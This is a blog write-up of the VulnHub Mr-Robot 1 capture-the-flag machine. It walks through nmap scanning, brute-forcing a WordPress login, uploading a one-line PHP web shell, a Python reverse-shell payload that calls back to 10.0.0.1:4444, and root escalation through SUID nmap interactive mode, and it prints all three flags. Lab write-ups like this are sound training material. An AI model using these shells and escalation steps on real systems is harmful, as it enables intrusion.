---
layout: post
title:	"Mr-Robot: 1 Writeup"
date:	2016-12-21 21:00:00
categories:
    - blog
tags:
    - vulnhub
---

Hello Friend,

This is my writeup for the CTF [Mr-Robot 1](http://www.vulnhub.com/entry/mr-robot-1,151/).

I ran nmap:

~~~
nmap -sT -sV -Pn 192.168.1.17
~~~

* -sT: full TCP scan (complete Three-Way Handshake)
* -sV: version of the services
* -Pn: skip host discovery (I had problems with ICMP echo request packets)

~~~
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-22 18:40 CEST
Nmap scan report for linux.homenet.telecomitalia.it (192.168.1.17)
Host is up (0.0014s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
22/tcp closed ssh
80/tcp open http Apache httpd
443/tcp open ssl/http Apache httpd
~~~

I ran another nmap with “-p 1-65535” parameters on all ports, but nothing changed.

The website was the same on port 80 and 443:

![Screenshot]({{ site.baseurl }}/images/2016-12-21-mr-robot-1-writeup/img1.png)

It was an animated console on a fsociety machine 😛

But… look at this:

![Screenshot]({{ site.baseurl }}/images/2016-12-21-mr-robot-1-writeup/img2.png)

First Key :

~~~
073403c8a58a1f80d943455fb30724b9
~~~

There was a wordpress blog on the website. I tried to enumerate users with wpscan, but it didn’t work. After some attempts, I found that ‘eliot’ was a valid username. I ran wpscan to bruteforce the wordpress login for user ‘eliot’ with the dictionary file ‘fsocity.dic’. The password was:

~~~
ER28–0652
~~~

After logged in, I uploaded a php shell:

~~~
<?php passthru($_GET[“cmd”]); ?>
~~~

![Screenshot]({{ site.baseurl }}/images/2016-12-21-mr-robot-1-writeup/img3.png)

I got a reverse shell on netcat by using this payload:

~~~
http://192.168.1.17/wp-content/uploads/2016/10/shell.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
~~~

I spawned a TTY shell:

~~~
/bin/sh: 0: can’t access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ python -c “import pty;pty.spawn(‘/bin/bash’);”
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/uploads/2016/10$
~~~

Ok I found this:

~~~
daemon@linux:/home/robot$ ls -l
ls -l
total 8
-r——– 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r–r– 1 robot robot 39 Nov 13  2015 password.raw-md5
~~~

I didn’t have permission to read the second key but I found something in the password.raw-md5 file:

~~~
root:c3fcd3d76192e4007dfb496cca67e13b
~~~

I used Crack Station and I got the second key:

~~~
root:abcdefghijklmnopqrstuvwxyz

daemon@linux:/home/robot$ su – robot
su – robot
Password: abcdefghijklmnopqrstuvwxyz
$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
~~~

After some local enumeration, I found nmap with SUID set to root on the system. This [paper](http://www.exploit-db.com/papers/18168/) explains how to get a root shell:

~~~
robot@linux:/usr/local/bin$ ls -l
ls -l
total 496
-rwsr-xr-x 1 root root 504736 Nov 13  2015 nmap
robot@linux:/usr/local/bin$ nmap –interactive
nmap –interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode — press h <enter> for help
nmap> ! id
! id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
waiting to reap child : No child processes
nmap> ! ls /root/
! ls /root/
firstboot_done    key-3-of-3.txt
waiting to reap child : No child processes
nmap> ! cat /root/key-3-of-3.txt
! cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
~~~

Goodbye friend.